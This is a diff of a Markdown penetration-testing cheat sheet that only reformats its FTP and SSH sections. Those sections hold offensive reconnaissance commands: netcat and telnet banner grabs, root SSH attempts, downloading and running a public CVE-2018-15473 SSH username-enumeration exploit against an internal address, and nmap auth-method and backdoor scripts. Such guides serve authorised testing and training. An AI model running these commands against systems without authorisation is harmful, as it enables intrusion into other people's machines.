@@ -219,18 +219,18 @@ nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp
 [Back](#summary)
 
 ## Port 22 - SSH 
-Can determine version by scanning it with nmap or connecting to it with nc or telnet
+* Can determine version by scanning it with nmap or connecting to it with nc or telnet
 ```nc
 nc 192.168.1.10 22
 telnet 192.168.1.10 22
 ssh root@IP -p 22
 ```
-Try to ssh
+* Try to ssh
 ```
 ssh root@IP -p 22
 ```
 
-Enumerate valid usernames
+* Enumerate valid usernames
 ```
 wget https://raw.githubusercontent.com/Rhynorater/CVE-2018-15473-Exploit/master/sshUsernameEnumExploit.py
 // or locate sshUsernameEnumExploit.py
@@ -239,7 +239,7 @@ python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list
 python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list --username Administrator 10.11.1.35
 ```
 
-(Enumeration Commands)[http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html]
+* [Enumeration Commands](http://www.lifeoverpentest.com/2018/02/enumeration-cheat-sheet-for-windows.html)
 ```
 nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
 nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
